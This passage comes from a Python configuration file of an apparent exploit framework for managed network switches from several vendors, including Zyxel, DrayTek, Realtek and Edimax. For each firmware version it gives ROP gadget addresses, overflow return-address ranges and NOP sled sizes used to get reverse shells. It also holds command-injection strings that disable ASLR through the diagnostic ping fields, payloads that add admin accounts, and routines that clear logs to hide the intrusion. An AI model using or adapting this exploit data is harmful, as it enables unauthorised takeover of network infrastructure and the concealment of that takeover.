    'handler': 0x2484afec,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 6,# Should leave as-is (but you can play between 5 - 8)
    'safe': False
    },
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    },
    },
    
    #
    # EdimaxPRO
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '225-63242': {
    'template':'Edimax',# Static for the vendor
    'model':'GS-5424PLC',
    'uri':'https://www.edimax.com/edimax/merchandise/merchandise_detail/data/edimax/global/smb_switches_poe/gs-5424plc',
    'version':'1.1.1.5',# Version / binary dependent stuff
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E6DC,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998524,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x248411bc,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi/set.cgi;  cgi_diag_traceroute_set()
    # traceroute
    'web_sys_ping_post':0x40DFF4,# Jump one after 'sw $ra'# (address, binary dependent)
    'sys_ping_post_cmd':'&srvHost=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
    'sys_ping_post_check':'',
    
    'verify_uri':'/tmp/check',
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
    'log_settings_set':0x41D99C,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_ramClear':0x41D8E4,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_fileClear':0x41D8E4,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntp_set':0x41620C,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntpDel_set':0x41620C,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSettings_set':0x41620C,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': False,# Not clear, may be to long URI for the stack
    },
    'heack_cgi_shell': {
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x7ffeff04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    '225-96283': {
    'template':'Edimax',# Static for the vendor
    'model':'GS-5424PLC',
    'uri':'https://www.edimax.com/edimax/merchandise/merchandise_detail/data/edimax/global/smb_switches_poe/gs-5424plc',
    'version':'1.1.1.6',# Version / binary dependent stuff
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E6DC,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998524,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x248411ac,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,#
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi/set.cgi;  cgi_diag_traceroute_set()
    # traceroute
    'web_sys_ping_post':0x40E024,# Jump one after 'sw $ra'# (address, binary dependent)
    'sys_ping_post_cmd':'&srvHost=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
    'sys_ping_post_check':'',
    
    'verify_uri':'/tmp/check',
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
    'log_settings_set':0x41D9EC,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_ramClear':0x41D934,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_fileClear':0x41D934,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,#
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntp_set':0x416254,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntpDel_set':0x416254,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSettings_set':0x416254,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x7ffeff04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,#
    },
    },
    },
    
    #
    # Zyxel
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : No
    # Del /mntlog/flash.log  : No
    # Add credentials        : Yes (adding username to next free index number, may not be #1)
    # Del credentials        : Yes (index number instead of username, may not be #1)
    #
    '222-71560': {
    'template':'Zyxel',# Static for the vendor
    'version':'2.40_AAHL.1_20180705',# Version / binary dependent stuff
    'model':'GS1900-24',# Model
    'uri':'https://www.zyxel.com/products_services/8-10-16-24-48-port-GbE-Smart-Managed-Switch-GS1900-Series/',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40D60C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998520,# la $t9, system) # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x2484e148,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,#
    },
    #
    #
    'stack_cgi_diag': {# Not vulnerable
    'address':0x4341C4,
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_localUser_post()
    'address':0x436D9C,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&usrName=USERNAME&usrPrivType=15&usrPriv=15',# Admin, priv 15
    'vulnerable': True,
    },
    'stack_cgi_del_account': { #
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_localUserDel_post()
    'address':0x437124,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&_del=1',# First additional user in the list
    'vulnerable': True,# user
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
    'log_settings_set':0x47D760,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_delete_post()
    'log_ramClear':0x480804,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_delete_post()
    'log_fileClear':0x480804,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,#
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntp_set':0x43BA8C,# Jump one after 'sw $ra'# Set SNTP Server (Inject CMD)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntpDel_set':0x43BA8C,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
    'sys_timeSettings_set':0x43AF54,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable':False,
    },
    'heack_cgi_shell': {
    'cgi':'dispatcher.cgi',# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
    'query':'username='+ self.random_string(100) +'_RA_START&password='+ self.random_string(59) +'&STARTUP_BACKUP=1'+ (('&' + struct.pack('>L',0x2404FF3D) + struct.pack('>L',0x2404FFFF)) * 70) + '&' + struct.pack('>L',0x2404FF3D) +'_SHELLCODE',
    'START':0x10010104,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP': 0x104006A0,# end: You may want to play with this if you dont get it working
    'usr_nop': 25,# NOP sled (shellcode will be tailed)
    'pwd_nop': 15,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    },
    },
    },
    
    #
    # Realtek
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : No
    # Del /mntlog/flash.log  : No
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '222-40570': {
    'template':'Realtek',# Static for the vendor
    'version':'3.0.0.43126',# Version / binary dependent stuff
    'model':'RTL8380-24GE-4GEC',# Model
    'uri':'https://www.realtek.com/en/products/communications-network-ics/item/rtl8381m-vb-cg-2',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E6DC,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system) # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x24841ea8,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # Ping IPv4
    'sys_ping_post_cmd':'ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space&count=1',
    'verify_uri':'/tmp/pingtest_tmp',
    'web_sys_ping_post':0x422980,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()
    
    # traceroute
    #'web_sys_ping_post':0x423168,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
    #'sys_ping_post_cmd':'ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/traceroute_tmp #&tr_maxhop=30&count=1',
    #'verify_uri':'/tmp/traceroute_tmp',
    'vulnerable': True,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
    'log_settings_set':0x481968,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_ramClear':0x4847DC,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_fileClear':0x4847DC,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'stack_cgi_sntp': {
    'sys_timeSntp_set':0x42C8F0,# Jump one after 'sw $ra'# Set SNTP Server (Inject CMD)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntpDel_set':0x42C8F0,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
    'sys_timeSettings_set':0x42C8F0,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'dispatcher.cgi',# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
    'query':'username=_USRNOP&password=_PWDNOP_RA_START&login=1&_USRNOP_USRNOP_SHELLCODE',
    'START':0x7fff7004,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 28,# NOP sled (shellcode will be tailed)
    'pwd_nop': 20,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # OpenMESH (some identical with enginius egs series)
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '13984-12788': {
    'template':'OpenMESH',# Static for the vendor
    'version':'01.03.24_180823-1626',# Version / binary dependent stuff
    'model':'OMS24',# Model
    'uri':'https://www.openmesh.com/',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E12C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x248405a0,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    # /sqfs/home/web/cgi/set.cgi;  cgi_sys_acctAdd_set()
    'address':0x424890,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pw=PASSWORD&pv=0&op=1&',# Admin, priv 15
    'vulnerable': True,
    },
    'stack_cgi_del_account': {
    # /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
    'address':0x424890,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pw=&pv=0&op=0',#
    'vulnerable': True,# user
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi-bin/datajson.cgi;  sn_ipv4PingSet()
    #'web_sys_ping_post':0x42341C,# Jump one after 'sw $ra'# (address, binary dependent)
    
    # /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
    'sys_ping_post_cmd':'&ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space #&mh=30&uid=0',
    'sys_ping_post_check':'&ip=127.0.0.1 ; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&uid=0',
    'verify_uri':'/conf_tmp/check',
    'web_sys_ping_post': 0x424248,# Jump one after 'sw $ra'# (address, binary dependent)
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
    'log_settings_set':0x43EA88,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_ramClear':0x440660,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_fileClear':0x440660,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSntp_set':0x425260,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
    'sys_timeSntpDel_set':0x425260,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
    'sys_timeSettings_set':0x425260,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'security.cgi',# /sqfs/home/web/cgi-bin/security.cgi; main()
    'START':0x100181A0,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x104006A0,# end: You may want to play with this if you dont get it working
    'usr_nop': 987,# NOP sled (shellcode will be tailed)
    'pwd_nop': 69,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # Xhome (identical with Realtek)
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : No
    # Del /mntlog/flash.log  : No
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '222-64895': {
    'template':'Xhome',# Static for the vendor
    'version':'3.0.0.43126',# Version / binary dependent stuff
    'model':'DownLoop-G24M',# Model
    'uri':'http://www.xhome.com.tw/product_info.php?info=p116_XHome-DownLoop-G24M----------------------------------------.html',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E6DC,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system) # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x24841ea8,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # Ping IPv4
    'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space&count=1',
    'verify_uri':'/tmp/pingtest_tmp',
    'web_sys_ping_post':0x4229A0,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()
    
    # traceroute
    #'sys_ping_post_cmd':'ip=127.0.0.1 ; echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/traceroute_tmp #&tr_maxhop=30&count=1',
    #'verify_uri':'/tmp/traceroute_tmp',
    #'web_sys_ping_post':0x423188,# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
    'vulnerable': True,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
    'log_settings_set':0x481988,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_ramClear':0x4847FC,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_fileClear':0x4847FC,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'stack_cgi_sntp': {
    'sys_timeSntp_set':0x42C910,# Jump one after 'sw $ra'# Set SNTP Server (Inject CMD)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntpDel_set':0x42C910,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
    'sys_timeSettings_set':0x42B6F8,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'dispatcher.cgi',# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
    'query':'username=_USRNOP&password=_PWDNOP_RA_START&login=1&_USRNOP_USRNOP_SHELLCODE',
    'START':0x7fff7004,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 28,# NOP sled (shellcode will be tailed)
    'pwd_nop': 20,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # Pakedgedevice & Software
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: No (cannot point JMP correct into NOP on heap)
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '225-21785': {
    'model':'SX-8P',
    'template':'Pakedge',# Static for the vendor
    'version':'1.04',# Version / binary dependent stuff
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40C86C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998538,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x248492ec,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
    'log_settings_set':0x413AEC,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_ramClear':0x413A14,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_fileClear':0x413A14,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntp_set':0x4108E4,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntpDel_set':0x4108E4,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSettings_set':0x4108E4,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x7ffeff04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # Draytek
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: No (cannot point JMP correct into NOP on heap)
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '752-95168': {
    'template':'DrayTek',# Static for the vendor
    'version':'2.1.4',# Version / binary dependent stuff
    'model':'VigorSwitch P1100',  #
    'uri':'https://www.draytek.com/products/vigorswitch-p1100/',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40C67C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99852c,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x248490ac,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
    'log_settings_set':0x413E34,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_ramClear':0x413D64,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_fileClear':0x413D64,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntp_set':0x410CA8,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntpDel_set':0x410CA8,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSettings_set':0x410CA8,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,#
    },
    'heack_cgi_shell': {
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x7ffeff04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # Cerio
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '224-5061': {
    'template':'Cerio',# Static for the vendor
    'version':'1.00.29',# Version / binary dependent stuff
    'model':'CS-2424G-24P',  #
    'uri':'https://www.cerio.com.tw/eng/switch/poe-switch/cs-2424g-24p/',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E6DC,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998524,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x248411bc,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi/set.cgi;  cgi_diag_traceroute_set()
    'sys_ping_post_cmd':'&srvHost=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check;&count=1',
    'sys_ping_post_check':'',
    'web_sys_ping_post':0x40E114,# Jump one after 'sw $ra'# (address, binary dependent)
    
    'verify_uri':'/tmp/check',
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi/set.cgi; cgi_log_global_set()
    'log_settings_set':0x41DB4C,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_ramClear':0x41DA94,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
    'log_fileClear':0x41DA94,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntp_set':0x415F14,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
